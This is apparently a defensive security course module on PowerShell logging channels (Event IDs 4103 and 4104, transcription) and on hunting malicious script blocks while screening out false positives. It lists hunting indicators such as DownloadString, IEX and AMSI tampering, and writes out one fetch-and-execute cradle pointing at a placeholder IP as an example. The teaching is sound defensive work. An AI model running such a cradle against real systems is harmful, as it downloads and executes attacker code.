# Module 13 — PowerShell Logging & Hunting

*Module concept · [Go to the hands-on lab →](lab.md)*

**Defensive Operations** — *the most-abused tool on Windows is also the most observable — if you turned the logging on.*

## Why this matters
PowerShell is the attacker's favourite Windows execution vector (Module 15 is the offensive side), and
it is also one of the most *catchable* — but only if you enabled the right logging before the incident.
The default install is nearly silent; the difference between a blind SOC and one that catches a cradle on
the first line is a Group Policy setting and a hunt that knows what to look for. This module is where you
turn PowerShell from the attacker's safe space into your highest-signal data source.

## Objective
Enable and reason about PowerShell's logging channels (script-block, module, and transcription), then
hunt real Event ID 4104 records to separate malicious script blocks from routine administration —
including the false-positive calls that decide whether your hunt is usable.

## The core idea
PowerShell has three logging channels and they are not interchangeable. **Module logging (Event ID
4103)** records pipeline execution — cmdlets and their bound parameters. **Script Block Logging (Event ID
4104)** is the one that matters most: it records the *text of the script block as PowerShell compiled it
to run* — which means it captures the **deobfuscated** command, after Base64 decoding and string
rebuilding, regardless of how the attacker dressed it up. **Transcription** writes a console-style
input/output record to disk for the human-readable story. The practitioner's mental model: 4103 tells you
*what cmdlets ran*, 4104 tells you *what code actually executed*, transcription tells you *what the
session looked like*. For hunting fileless PowerShell, 4104 is the crown jewel.

The catch that blinds most teams: **none of this is on by default at the level you need.** Script Block
Logging has to be enabled by GPO or registry (`...\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging`),
and you cannot retroactively log an event that already happened — telemetry is a *before-the-incident*
decision. Worse, attackers run PowerShell v2 precisely because it predates script-block logging, so a
"`-Version 2`" downgrade is itself something to alert on. Turning the logging on, verifying it actually
lands, and watching for attempts to evade it *is* the job before any hunting starts.

Once the data exists, hunting it is pattern recognition over the `ScriptBlockText` field. A short
vocabulary of high-signal indicators covers most abuse: remote fetch (`DownloadString`/`DownloadFile`),
in-memory execution (`IEX`/`Invoke-Expression`), embedded payloads (`FromBase64String`), AMSI tampering
(`amsiInitFailed`), and obfuscation tells (long `[char]`-code chains). The judgement — and the thing that
separates a hunt from an alert cannon — is the **false positive**: administrators download files and run
encoded commands too. A patch script pulling an MSI from an *internal* host and saving it to disk is not
the same as `IEX (DownloadString('http://1.2.3.4/a'))`, even though both "download." Context — internal vs.
external, save-to-disk vs. execute-in-memory, who and where — is what you own. A rule that flags every
download is worse than no rule.

This module deliberately works the same artifact the offensive side produces: the script blocks you hunt
here are exactly the cradles, encodings, and obfuscation from Module 15. Hunt them by hand first to learn
the fields, then graduate to running Sigma rules at scale with a tool like Chainsaw — which is how
Module 08's detection-as-code reaches production.

## Learn (~4 hrs)

**See the channels (video-first)**
- [13Cubed — Understanding Advanced PowerShell Logging](https://www.youtube.com/watch?v=y1qP80nOT5Q) — a
  focused DFIR walkthrough of module vs. script-block vs. transcription logging and the settings gotchas.
  Watch for *why* 4104 captures deobfuscated text and where the settings trip people up.

**Turn it on**
- [Microsoft — about_Logging_Windows](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
  — the authoritative reference for enabling script-block (4104) and module (4103) logging via GPO or the
  registry, and the Protected Event Logging note for sensitive data.

**Hunt it**
- [TrustedSec — Building a Detection Foundation, Part 3: PowerShell and Script Logging](https://trustedsec.com/blog/building-a-detection-foundation-part-3-powershell-and-script-logging)
  — what good detections over 4104 actually look like, and how to think about the noise.
- [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/) — read the
  Detection and Data Sources sections to anchor your hunt to the technique.

**Scale it**
- [Chainsaw (WithSecureLabs)](https://github.com/WithSecureLabs/chainsaw) — run Sigma rules over EVTX at
  speed; the production tool you graduate to once your hand-hunt logic is sound.

## Key concepts
- The three channels: module (4103), script block (4104), transcription — and what each captures
- Why 4104 records the **deobfuscated** command, defeating attacker obfuscation
- Logging is off-by-default and must be enabled *before* the incident (and can't be applied retroactively)
- PowerShell v2 downgrade as an evasion to alert on
- A core indicator vocabulary: remote download, in-memory exec, Base64 decode, AMSI tamper, `[char]` obfuscation
- False-positive discrimination (internal vs. external, disk vs. memory) is the real skill

## AI acceleration
A model triages 4104 noise fast — feed it a batch of script blocks and have it classify and explain the
suspicious ones, or draft the Sigma rule from your indicator list. Then *you* run it against the real
sample and confirm it fires on the malicious blocks and **not** on the benign admin download — a model
that flags every `DownloadString` has just built you an alert cannon. AI proposes; you tune and own the rule.
